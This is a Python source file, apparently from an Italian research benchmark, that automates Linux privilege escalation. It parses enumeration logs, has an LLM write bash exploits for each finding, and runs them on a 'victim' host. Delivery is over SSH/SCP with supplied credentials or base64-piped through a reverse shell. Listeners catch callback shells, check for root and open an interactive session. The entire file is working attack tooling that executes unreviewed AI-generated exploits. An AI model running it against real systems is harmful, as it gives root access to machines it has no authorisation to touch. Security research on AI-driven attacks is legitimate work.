import sys
import re
import argparse
import subprocess
import time
import base64
from Linpeas_Parser import LinpeasParser
from LinEnum_Parser import LinEnumParser
from lse_parser import LseParser
from suid3num_parser import Suid3numParser
from llm_client import LLMClient
from pwn import *

contatore_fallimenti = 0
tempo_inizio = 0          
durata_attacco = None

def execute_automated_exploit_revshell(llm_response, shell_session, lport_2=4445):
    global durata_attacco
    global contatore_fallimenti
    match = re.search(r'```bash\n(.*?)\n```', llm_response, re.DOTALL)
    if not match:
        print("[-] Nessun codice bash eseguibile trovato nella risposta.")
        return False

    bash_script_content = match.group(1).strip()
    if "NO_VULN" in bash_script_content:
        return False 
        
    b64_payload = base64.b64encode(bash_script_content.encode('utf-8')).decode('utf-8')
    
    print("\n--- PREPARAZIONE PAYLOAD ---")
    print(f"[*] Payload convertito in Base64")
    
    remote_script_path = "/dev/shm/payload_pe.sh"
    delivery_cmd = f"echo '{b64_payload}' | base64 -d > {remote_script_path} && chmod +x {remote_script_path} && {remote_script_path}"
    
    
    is_rev_shell = str(lport_2) in bash_script_content
    
    if is_rev_shell:
        import socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(15)  
        try:
            server.bind(('0.0.0.0', lport_2))
            server.listen(1)
        except Exception as e:
            print(f"[!] Impossibile avviare il secondo listener sulla porta {lport_2}: {e}")
            return False

        print(f"[*] Svuotamento buffer sessione attiva (Max 0.5s)...")
        shell_session.clean(timeout=0.5) 
        
        print(f"[*] Invio ed esecuzione del payload sulla sessione attiva...")
        shell_session.sendline(delivery_cmd.encode('utf-8'))
        
        try:
            print(f"[*] Framework: Secondo listener attivo su porta {lport_2}. In attesa della nuova shell (Timeout 15s)...")
            conn, addr = server.accept()
            print(f"[+] Framework: Nuova connessione ricevuta da {addr}!")
            
            from pwn import remote as pwn_remote
            io = pwn_remote.fromsocket(conn)
            
            io.clean(timeout=0.5)
            
            io.sendline(b"id")
            risposta = io.clean(timeout=1.0).decode('utf-8', errors='ignore')
            print(f"[*] Framework: Output di verifica ricevuto:\n{risposta.strip()}")
            
            if "uid=0(root)" in risposta:
                print("\n[+++] PRIVILEGE ESCALATION CONFERMATA[+++]")
                durata_attacco = time.time() - tempo_inizio
                io.interactive()
                return True
            else:
                contatore_fallimenti+=1
                print(f"[-]Privilege escalation fallita, utente: {risposta.strip()}")
                io.close()
                return False
                
        except socket.timeout:
            print("[-] Timeout raggiunto: Nessun secondo callback ricevuto sulla porta di ascolto. L'exploit ha fallito.")
            contatore_fallimenti+=1
            return False
        finally:
            server.close()

    
    else: 
        print(f"[*] Esecuzione payload locale sulla sessione attiva...")
        shell_session.clean(timeout=0.5) 
        shell_session.sendline(delivery_cmd.encode('utf-8'))
        
        time.sleep(1)
        output = shell_session.recv(timeout=3).decode('utf-8', errors='ignore')
        
        if output.strip():
            print("\n[ RISULTATO TERMINALE VITTIMA (STDOUT/STDERR) ]")
            print(output.strip())
        
        print("\n[*] Controllo dei privilegi sulla sessione corrente...")
        shell_session.sendline(b"id")
        
        whoami_output = shell_session.clean(timeout=1.0).decode('utf-8', errors='ignore').strip()
        print(f"[*]Output di verifica ricevuto:\n{whoami_output}")
        
        if "uid=0(root)" in whoami_output.lower():
            print(f"\n[+++] PRIVILEGE ESCALATION CONFERMATA[+++]")
            durata_attacco = time.time() - tempo_inizio
            shell_session.interactive()
            return True

        else:
            contatore_fallimenti+=1
            error_keywords = [
                "permission denied", "no such file", "invalid option", 
                "command not found", "error", "failed", "only root can", 
                "unrecognized option", "syntax error", "must be privileged",
                "not mounted", "usage:", "cannot", "invalid", "bad usage",
                "operation not permitted", "password:", "password for", "su:",
                "a terminal is required", "askpass helper", "sorry, try again", "do not have permission",
                "not permitted to", "unauthorized", "sudo: a password is required",
                "no tty present", "askpass program specified",
                "segmentation fault", "segfault", "core dumped", "bus error", "illegal instruction",
                "ld returned 1 exit status", "implicit declaration of function", "undefined reference to", "macro redefinition" ,"too few arguments"
            ]
            
            full_output = (output + "\n" + whoami_output).lower()
            
            if any(err in full_output for err in error_keywords):
                print(f"[-] Exploit fallito. L'esecuzione ha generato errori bloccanti.")
                return False
            else:
                print(f"[-] Sessione primaria invariata. Privilege escalation fallita.")
                return False

def execute_automated_exploit(llm_response, target_ip, target_user, target_pass=None, target_key=None, lport=None):
    global contatore_fallimenti
    match = re.search(r'```bash\n(.*?)\n```', llm_response, re.DOTALL)
    if not match:
        print("[-] Nessun codice bash eseguibile trovato nella risposta.")
        return False

    bash_script_content = match.group(1).strip()
    if "NO_VULN" in bash_script_content:
        return False 

    if target_pass and "sudo " in bash_script_content:
        bash_script_content = re.sub(
            r'(^|\n)sudo ', 
            rf"\1echo '{target_pass}' | sudo -S ", 
            bash_script_content
        )
    elif target_key and not target_pass and "sudo " in bash_script_content:
        bash_script_content = re.sub(
            r'(^|\n)sudo ', 
            rf"\1sudo -n ", 
            bash_script_content
        )

    print("\n--- PREPARAZIONE PAYLOAD ---")
    local_script_path = "payload.sh"
    remote_script_path = "/dev/shm/payload_pe.sh"
    
    try:
        with open(local_script_path, "w", newline='\n') as f:
            f.write("set -e\n" + bash_script_content)
        print("[+] Script payload.sh generated localmente.")
    except Exception as e:
        print(f"[!] Errore nella creazione del file locale: {e}")
        return False

    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa"
    
    if target_key:
        scp_base = f"scp -i {target_key} -O {ssh_opts}"
        ssh_base = f"ssh -i {target_key} {ssh_opts}"
    elif target_pass:
        scp_base = f"sshpass -p '{target_pass}' scp -O {ssh_opts}"
        ssh_base = f"sshpass -p '{target_pass}' ssh {ssh_opts}"
    else:
        print("[-] Errore: Nessuna credenziale fornita.")
        return False

    print(f"[*] Trasferimento {local_script_path} sulla vittima...")
    scp_cmd = f"{scp_base} {local_script_path} {target_user}@{target_ip}:{remote_script_path}"   

    try:
        subprocess.run(scp_cmd, shell=True, check=True, capture_output=True, text=True, timeout=20)
        print("[+] Trasferimento SCP completato.")
    except Exception as e:
        print(f"[!] Errore di connessione o trasferimento SCP.")
        return False

    print("[*] Esecuzione payload in corso...")
    ssh_cmd = f"{ssh_base} {target_user}@{target_ip} 'chmod +x {remote_script_path} && {remote_script_path} ; echo \"\\n--- PRIV_CHECK ---\" ; whoami'"    
    
    is_rev_shell = str(lport) in bash_script_content

    if is_rev_shell and lport:
        import socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(12) 
        try:
            server.bind(('0.0.0.0', lport))
            server.listen(1)
        except Exception as e:
            print(f"[!] Impossibile avviare il listener sulla porta {lport}: {e}")
            return False

        proc = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        try:
            print(f"[*] Framework: Listener attivo su porta {lport}. In attesa di callback reale...")
            conn, addr = server.accept()
            print(f"[+] Framework: Connessione ricevuta da {addr}!")
            
            from pwn import remote as pwn_remote
            io = pwn_remote.fromsocket(conn)
            
            io.clean(timeout=0.5)
            
            io.sendline(b"id")
            
            risposta = io.clean(timeout=1.0).decode('utf-8', errors='ignore')
            print(f"[*] Framework: Output di verifica ricevuto:\n{risposta.strip()}")
            
            if "uid=0(root)" in risposta:
                print("\n[+++] PRIVILEGE ESCALATION COMPLETATA [+++]")
                global durata_attacco
                durata_attacco = time.time() - tempo_inizio
                print("\n[*] Entrata in modalità interattiva.")
                io.interactive()
                proc.terminate()
                return True
            else:
                print(f"[-] Callback ricevuto ma fallito. Risposta: {risposta.strip()}")
                io.close()
                proc.terminate()
                contatore_fallimenti+=1
                return False
                
        except socket.timeout:
            print("[-] Timeout raggiunto: Nessun callback di rete ricevuto. L'exploit ha fallito.")
            proc.terminate()

def main():
    global tempo_inizio, durata_attacco    
    tempo_inizio = time.time()
    parser = argparse.ArgumentParser()
    parser.add_argument("log_file")
    parser.add_argument("--tool", choices=['linpeas','linenum','lse','suid3num'], required=True)
    parser.add_argument("--mode", choices=['ssh', 'revshell'], required=True)
    parser.add_argument("--ip")
    parser.add_argument("--user")
    parser.add_argument("--password")
    parser.add_argument("--key")
    parser.add_argument("--lport", type=int)
    
    parser.add_argument("--model", default="qwen2.5-coder:32b", help="Nome del modello da usare su Ollama")

    args = parser.parse_args()

    if args.mode == 'ssh':
        if not all([args.ip, args.user]):
            print("Errore: La modalità 'ssh' richiede l'uso di --ip, --user")
            sys.exit(1)
        if not args.password and not args.key:
            print("Errore: La modalità ssh richiede l'uso di --password oppure --key.")
            sys.exit(1)
            
    if args.mode == 'revshell' and not args.lport:
        print("Errore: La modalità 'revshell' richiede l'uso di --lport.")
        sys.exit(1)
    

    print("AUTOMATIZZAZIONE PRIVILEGE ESCALATION")
    print(f"[*] Modalità Operativa: {args.mode.upper()}")
    print("---------\n")
    
    if args.tool == "linpeas":
        parser = LinpeasParser()
    elif args.tool == "linenum":
        parser = LinEnumParser()
    elif args.tool == "lse":
        parser = LseParser()
    elif args.tool == "suid3num":
        parser = Suid3numParser()
    else:
        sys.exit(1)
    
    ai_client = LLMClient(model=args.model)
    
    shell_session = None
    if args.mode == 'revshell':
        print(f"[*] In attesa di una reverse shell in ingresso sulla porta {args.lport}...")
        context.log_level = 'error' 
        shell_session = listen(args.lport).wait_for_connection()
        print(f"[+] Connessione stabilita con {shell_session.rhost}!")

    print(f"Lettura e analisi del file di log: {args.log_file}...")
    vulnerabilities = parser.parse_file(args.log_file)
    
    if not vulnerabilities:
        print("[-] Nessuna vulnerabilità trouvata nel file di log. Uscita.")
        if shell_session: shell_session.close()
        sys.exit(0)
        
    print(f"[+] Trovati {len(vulnerabilities)} potenziali vettori d'attacco.\n")

    success = False 
    i = 0 
    
    for index, vuln in enumerate(vulnerabilities):
        if i < 0:
            i += 1
            continue
        
        print(f"--- [ VETTORE #{index + 1} ] ---")
        print(f"Target: {vuln['text']}")
        
        response = ai_client.generate_exploit(vuln['text'])
        if "[NO_VULN]" in response:
            print("[-] L'LLM ha scartato questo vettore\n")
            continue
            
        print("\n[ANALISI LLM COMPLETA]")
        print(response)
        
        if args.mode == 'ssh':
            porta_ascolto = args.lport if args.lport else 4445
            success = execute_automated_exploit(
                response, 
                args.ip, 
                args.user, 
                target_pass=args.password, 
                target_key=args.key,
                lport=porta_ascolto
            )
        elif args.mode == 'revshell':
            success = execute_automated_exploit_revshell(response, shell_session)
        
        if success:
            print("\n[*] Successo rilevato. Interruzione o continuazione in base al setup statistico.")
            break
            
        print("\n" + "="*50 + "\n")
    print(f"\nL'agente ha generato un exploit è fallito {contatore_fallimenti} volte")
    if shell_session and not success:
        shell_session.close()
    
    if durata_attacco is None:
        durata_attacco = time.time() - tempo_inizio
    
    minuti = int(durata_attacco // 60)
    secondi = int(durata_attacco % 60)
    
    print("\n" + "="*50)
    print(f"[+] BENCHMARK COMPLETATO")
    print(f"[*] Tempo effettivo impiegato dall'agente: {minuti:02d}:{secondi:02d}")
    print("="*50 + "\n")
if __name__ == "__main__":
    main()